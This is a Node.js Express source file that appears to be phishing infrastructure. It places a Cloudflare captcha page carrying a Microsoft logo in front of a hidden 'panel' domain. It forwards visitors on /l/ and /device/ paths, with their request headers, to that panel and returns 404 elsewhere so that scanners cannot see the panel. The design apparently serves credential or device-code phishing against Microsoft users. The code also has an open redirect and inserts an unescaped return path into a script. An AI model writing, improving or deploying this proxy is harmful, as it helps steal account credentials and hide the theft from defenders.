const express = require('express');
const cookieParser = require('cookie-parser');
const app = express();
const port = process.env.PORT || 3000;

app.set('trust proxy', 1);

const PANEL = 'portal42-343.sbs';
const SITE_KEY = '0x4AAAAAAD1A5eW6o0hhUZQm';
const SECRET_KEY = 'YOUR_TURNSTILE_SECRET_KEY'; // ⚠️ Keep this – required for verification

app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(cookieParser());

// ---- CAPTCHA PAGE (uses your design) ----
app.get('/captcha', (req, res) => {
    let returnPath = req.query.return || '/';
    if (returnPath.startsWith('//')) returnPath = returnPath.replace(/^\/+/, '/');
    if (!returnPath.startsWith('/')) returnPath = '/' + returnPath;
    res.send(getCaptchaHTML(SITE_KEY, returnPath));
});

// ---- PROTECTED ROUTES - redirect to CAPTCHA ----
app.get('/l/*', (req, res) => {
    res.redirect(`/captcha?return=${encodeURIComponent(req.originalUrl)}`);
});
app.get('/device/*', (req, res) => {
    res.redirect(`/captcha?return=${encodeURIComponent(req.originalUrl)}`);
});

// ---- VERIFICATION (sets cookie and redirects) ----
app.post('/verify-captcha', async (req, res) => {
    const token = req.body['cf-turnstile-response'];
    if (!token) return res.status(400).send('Missing token');

    try {
        const verify = await fetch('https://challenges.cloudflare.com/turnstile/v0/siteverify', {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: `secret=${SECRET_KEY}&response=${token}`
        });
        const data = await verify.json();
        if (data.success) {
            res.cookie('captcha_passed', 'true', {
                maxAge: 300000,
                httpOnly: true,
                secure: true,
                sameSite: 'lax'
            });
            const returnTo = req.query.return || '/';
            return res.redirect(returnTo);
        } else {
            res.status(400).send('CAPTCHA verification failed');
        }
    } catch (e) {
        console.error('Verification error:', e);
        res.status(500).send('Server error');
    }
});

// ---- PROXY ONLY FOR /l/ AND /device/ (with cookie check) ----
app.use('/l/*', async (req, res) => {
    if (!req.cookies.captcha_passed) {
        return res.redirect(`/captcha?return=${encodeURIComponent(req.originalUrl)}`);
    }
    try {
        const target = new URL(req.originalUrl, `https://${PANEL}`);
        const headers = new Headers(req.headers);
        headers.set('Host', PANEL);
        headers.set('User-Agent', 'Mozilla/5.0');
        const response = await fetch(target.toString(), { method: req.method, headers });
        const body = await response.text();
        res.status(response.status).set('Content-Type', response.headers.get('content-type') || 'text/html').send(body);
    } catch (e) {
        res.status(500).send('Proxy Error');
    }
});

app.use('/device/*', async (req, res) => {
    if (!req.cookies.captcha_passed) {
        return res.redirect(`/captcha?return=${encodeURIComponent(req.originalUrl)}`);
    }
    try {
        const target = new URL(req.originalUrl, `https://${PANEL}`);
        const headers = new Headers(req.headers);
        headers.set('Host', PANEL);
        headers.set('User-Agent', 'Mozilla/5.0');
        const response = await fetch(target.toString(), { method: req.method, headers });
        const body = await response.text();
        res.status(response.status).set('Content-Type', response.headers.get('content-type') || 'text/html').send(body);
    } catch (e) {
        res.status(500).send('Proxy Error');
    }
});

// ---- ALL OTHER PATHS – 404 (hides your panel) ----
app.use('*', (req, res) => {
    res.status(404).send('Not Found');
});

app.listen(port, () => console.log('✅ Proxy running on port ' + port));

// ---- CAPTCHA HTML (your design, with auto-redirect) ----
function getCaptchaHTML(siteKey, returnPath) {
    return `
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Verify</title>
  <script src="https://challenges.cloudflare.com/turnstile/v0/api.js?onload=onTurnstileLoad" async defer></script>
  <style>
    /* Your existing CSS (keep as is) */
    body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; background: #f5f5f5; }
    .container { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); text-align: center; max-width: 400px; }
    .error { color: #d32f2f; padding: 20px; background: #ffebee; border-radius: 4px; }
    .loading { color: #1976d2; padding: 20px; }
    #cf-turnstile { display: flex; justify-content: center; margin: 20px 0; }
    #dp { margin-top: 20px; }
    /* Keep all your existing styling for the logo animation etc. */
  </style>
</head>
<body>
  <div class="container">
    <!-- Your full logo animation HTML (keep as is) -->
    <div id="loadingLogo" dir="ltr"> ... </div>
    <div id="dp"></div>
    <div id="cf-turnstile"></div>
    <div id="status"></div>
    <img src="https://res.cdn.office.net/assets/framework/microsoft.svg" id="MSLogo" alt="MS">
  </div>
  <script>
    // ---- DYNAMIC RETURN PATH ----
    const returnPath = "${returnPath}";

    // ---- MESSAGES ----
    const messages = ["Loading...", "Processing request...", "Preparing results...", "Almost there...", "Finalizing..."];
    let index = 0;
    function cycleMessages() {
      document.getElementById("dp").textContent = messages[index];
      index = (index + 1) % messages.length;
    }
    cycleMessages();
    setInterval(cycleMessages, 3000);

    // ---- TURNSTILE CALLBACK (auto-redirect) ----
    function turnstileCallback(token) {
      if (token) {
        // Send token to backend for verification, then redirect
        fetch('/verify-captcha?return=' + encodeURIComponent(returnPath), {
          method: 'POST',
          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
          body: 'cf-turnstile-response=' + token
        }).then(response => {
          if (response.redirected) {
            window.location.href = response.url;
          } else {
            // If not redirected, go to returnPath
            window.location.href = returnPath;
          }
        }).catch(() => {
          window.location.href = returnPath;
        });
      }
    }

    function turnstileErrorCallback() {
      document.getElementById('status').textContent = 'Error. Please refresh.';
      document.getElementById('status').style.display = 'block';
      setTimeout(() => window.location.reload(), 1500);
    }
    function turnstileExpiredCallback() {
      if (window.turnstile) turnstile.reset();
      document.getElementById('status').textContent = 'Expired. Please try again.';
      document.getElementById('status').style.display = 'block';
    }
    function onTurnstileLoad() {
      turnstile.render('#cf-turnstile', {
        sitekey: '${siteKey}',
        theme: 'light',
        callback: turnstileCallback,
        'error-callback': turnstileErrorCallback,
        'expired-callback': turnstileExpiredCallback,
      });
    }
  </script>
</body>
</html>
    `;
}
